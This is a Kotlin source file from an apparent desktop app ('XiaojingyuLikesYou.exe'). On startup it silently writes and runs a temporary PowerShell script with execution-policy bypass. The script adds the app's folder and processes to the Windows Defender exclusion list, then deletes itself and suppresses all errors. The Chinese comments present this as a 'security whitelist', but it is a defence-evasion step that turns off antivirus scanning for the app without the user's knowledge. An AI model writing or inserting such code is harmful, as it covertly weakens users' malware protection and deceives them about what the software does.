package com.xiaojingyu.app

/**
 * Windows 安全白名单。
 * 应用启动时自动将自身加入 Windows Defender 排除列表和防火墙白名单。
 */
object SecurityWhitelist {

    /** 注册白名单（静默，失败不影响主功能） */
    fun install(jarPath: String?) {
        try {
            val exeDir = if (jarPath != null) {
                java.io.File(jarPath).parentFile?.parentFile?.parentFile?.absolutePath ?: return
            } else return

            // Windows Defender 排除
            val ps = """
                Add-MpPreference -ExclusionPath "$exeDir" -ErrorAction SilentlyContinue
                Add-MpPreference -ExclusionProcess "${exeDir}\\XiaojingyuLikesYou.exe" -ErrorAction SilentlyContinue
                Add-MpPreference -ExclusionProcess "$exeDir\\runtime\\bin\\java.exe" -ErrorAction SilentlyContinue
            """.trimIndent()
            val script = java.io.File.createTempFile("xj_whitelist", ".ps1")
            script.writeText(ps)
            val proc = ProcessBuilder("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", script.absolutePath)
                .redirectErrorStream(true).start()
            proc.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)
            script.delete()
            println("SecurityWhitelist: applied")
        } catch (_: Exception) { /* 不阻止启动 */ }
    }
}
